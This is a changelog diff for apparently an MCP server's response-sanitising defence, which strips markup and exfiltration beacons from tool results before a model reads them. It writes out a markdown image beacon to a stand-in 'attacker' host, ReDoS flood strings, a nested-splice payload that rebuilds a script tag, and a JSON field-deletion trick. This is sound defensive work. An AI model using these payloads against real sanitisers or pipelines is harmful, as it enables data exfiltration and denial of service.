@@ -5,6 +5,124 @@ All notable changes to this project will be documented in this file.
 The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
 and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
+## [3.4.0] - 2026-09-02
+
+### Security
+
+- **The defence deleted a JSON field when two of its values held the halves of one markup token.** By
+  the post-processor wrap, `formatResponse` has sealed body, headers and stderr into a single JSON
+  envelope, and the strip stages pair an opening token with a closing one without any notion of the
+  syntax separating two fields. A body carrying `<!--` and a response header carrying `-->` therefore
+  had everything between them removed — **including the whole `headers` key** — and the result was
+  still valid JSON, so nothing downstream could tell. The same held for one plain JSON document whose
+  sibling values carried the two halves, which is the shape `jq_query` returns. `defendForInline` now
+  parses a JSON document and defends each string value separately; text that is not JSON still takes
+  the undivided scan. Re-serialising indents only where indenting does not grow the document, so the
+  size gate's growth bound stays sound — `formatResponse` and jq both emit two spaces and come back
+  looking as they went in. Object keys are deliberately
+  left undefended, because two keys defending to the same string would collapse into one — the very
+  loss this fixes. See `ARCHITECTURE.md` invariant 16.
+
+- **A quadratic scan in the response strip path could block the event loop for 82 seconds.** Four of
+  the five markdown beacon patterns shared a `[^\]\n]*` label class, so a failing match attempt
+  scanned forward from every `[` in the input: O(n) attempts of O(n). 256 KB of `[` measured 82.9 s,
+  synchronously, on the thread serving every session — on stdio the server is dead for the duration,
+  on HTTP every session stalls. The `<script`/`<style` openers had the same shape at 4.5 s. The
+  patterns' own docblock claimed the 256 KB cap guaranteed "wall-clock < 100 ms on any adversarial
+  input"; it was wrong by ~800×, because a byte cap bounds the input and never the cost. The ReDoS
+  guard that should have caught it fed a single opener, which the pattern consumed in one match, so
+  it could not fail.
+
+  Every pass now runs over only the prefix ending at that pattern's own closing token, so a failing
+  attempt cannot scan to end-of-input. **The first attempt at this bound keyed on the wrong tokens
+  and closed only part of the class** — a bare `>` does not bound a closer of `</script>`, and
+  excluding `[` from a markdown label does not bound a URL class ending at `)`. Review of this PR
+  measured what remained: `"<script>".repeat(32000)` 1.1 s, `"<script></x>".repeat(20000)` 1.7 s,
+  `"[a](https://x".repeat(19000)` 2.9 s, and `"<!--".repeat(65536)` **5.5 s** — the last a
+  regression this branch introduced by removing the open-to-EOF arm without bounding what replaced
+  it. All now run in 1–2 ms. The replacement flood tests were themselves toothless at a 2 s budget,
+  which is recorded beside them.
+
+  **A fourth review round found the class open from the opposite side, inside a bound that was
+  computed correctly.** The region bound guarantees a closer lies ahead of every attempt; it does
+  not guarantee the attempt can reach one. The opener `<script\b[^>]*>` had an attribute run that
+  crossed `<`, so on `"<script".repeat(30000) + "</script>"` each opener consumed the region's only
+  closer as its own tag terminator and then scanned to end-of-input for a second — **2881 ms on a
+  205 KB body**. Round 2 had fixed exactly this on the *closer* and argued in writing that the
+  asymmetry was safe. Both attribute runs are now `[^<>]*`. The cost of the exclusion is stated
+  rather than buried: a literal `<` inside a quoted attribute value stops the balanced match, so
+  the body survives as inert text — both tags still go, which is the RC-11 posture the closer has
+  had since round 2. `LESSONS.md` RC-14.
+- **`max_result_size` now bounds what the model actually receives, which is what invariant 14 already
+  claimed.** The defence pass can make text longer — `[link removed]` is 14 bytes and the shortest
+  form it replaces is 9 — and this release added a second pass at the post-processor wrap,
+  downstream of every size gate. A `text/plain` body of `"[a](file:)".repeat(100)`, exactly 1000
+  bytes under a 1000-byte cap, stayed inline and reached the model as **1400 bytes** with the gate
+  reporting compliance. Both size gates now ask `exceedsInlineCap`, which weighs the defended form;
+  over-cap saves to a file as it always did. Found by review, twice, independently.
+
+  **Not fixed at the wrap, and the measurement is why.** By the wrap the body is sealed inside the
+  metadata envelope: a *compliant* 1000-byte body arrives there as a 1057-byte text part under
+  `include_metadata`, so a wrap-side cap would truncate correct responses mid-JSON, and the wrap has
+  no file to save to. `LESSONS.md` RC-15.
+- **Custom tools, hook short-circuits and YAML endpoints now get the full response defence.** The
+  post-processor wrap ran `sanitizeAndDetect` alone — Step 2 of the five in `defendText` — so a
+  `registerCustomTool()` handler returning remote markdown or HTML reached the model with
+  exfiltration beacons (`![x](https://attacker/?d=…)`) and `<script>` blocks intact. For those
+  channels the wrap is the *only* defence; there is no `processResponse` upstream of them.
+- **A beacon inside a JSON string value no longer reaches the model.** The JSON exemption protects a
+  persisted artefact — `processResponse` writes post-strip content to disk and `jq_query` reads it
+  back — and that reasoning does not reach the wrap, whose channels write to no disk. What is
+  persisted keeps the exemption; what is returned does not. **"Persisted keeps it" is true of the
+  content types that can claim it:** the exemption is gated on the type being undetermined or
+  sniffable, so a JSON body the origin declared `text/html` or `text/markdown` is treated as what it
+  was declared to be and is persisted stripped. `ARCHITECTURE.md` invariant 1a states the gate and
+  what it costs.
+
+### Fixed
+
+- **A `<script>` or `<style>` tag no longer survives a nested-splice payload.** Removing a tag can
+  rejoin its neighbours into a new one — `"<scr".repeat(4) + "<script>" + "ipt>".repeat(4)` returned
+  a live `<script>` — and iterating the strip exposes only one layer per pass, so the four-iteration
+  fixed point moved the surviving depth to four rather than removing the class. Both the tag strip
+  and the comment strip are now single left-to-right scans that test the output tail, which
+  converges without iterating. Reported by CodeQL on two rounds and by CodeRabbit as a class.
+- **An unclosed `<!--`, `<script>` or `<style>` no longer deletes the rest of the payload.** The
+  open-to-end-of-input arm replaced with an empty string, so one unclosed opener truncated
+  everything after it — silently, with no marker, no `isError` and no observable length delta.
+  `"before <!-- unclosed\nafter"` returned `"before "`. Balanced blocks are still removed whole; an
+  orphan opener now has its tag removed and its body kept as inert text, which satisfies the CodeQL
+  incomplete-sanitization rule the arm was added for without deleting the caller's content.
+- **A JSON body served with a markup `Content-Type` is no longer corrupted.** The entity decode
+  turned `{"q":"a &#x22;b&#x22;"}` into `{"q":"a "b"}`, which no longer parses — and `save_to_file`
+  persisted it for `jq_query` to fail on. The sniffed arm already excluded JSON bodies; the declared
+  arm did not, so one mislabelled header was enough.
+
+### Added
+
+- **`defendText` is now a public export.** It is the full defence pipeline over a plain string, and
+  the function the built-in tools call. Consumers building a non-MCP pipeline were previously
+  pointed at `sanitizeAndDetect`, described as "the same defence the built-in tools apply" — it is
+  one stage of it. `docs/custom-tools.md` is corrected accordingly.
+
+### Changed
+
+- **`contentTypeUndetermined` is a required field on `DefendTextOptions`.** Not a breaking change:
+  the type and the function it configures are both new in this release, so no consumer can be
+  holding the optional form. Both grammar selectors
+  were optional and absence resolved to the *permissive* arm, so `defendText(text, { hostname })`
+  compiled, looked defended, and ran Step 2 alone. Pass `false` when you know the content type —
+  including knowing the origin sent none — and `true` when you could not determine it.
+
+  **Omission now resolves to the strictest grammar at runtime as well.** A required field binds
+  TypeScript callers and does nothing to a JavaScript one, and this release publishes the function —
+  so the type alone left the permissive arm reachable by exactly the consumer it was added to
+  protect. Reported independently by two reviewers on PR #33.
+- Markdown link and image syntax in a `text/plain` or `text/html` tool result is now rewritten to
+  `[link removed]` / `[image removed]` at the wrap. Previously this depended on `include_metadata`:
+  with it true the body sat inside a JSON envelope that the exemption protected, with it false it
+  did not, so the same bytes got two different treatments selected by an output-format flag.
+
 ## [3.3.0] - 2026-09-01
 
 ### Fixed
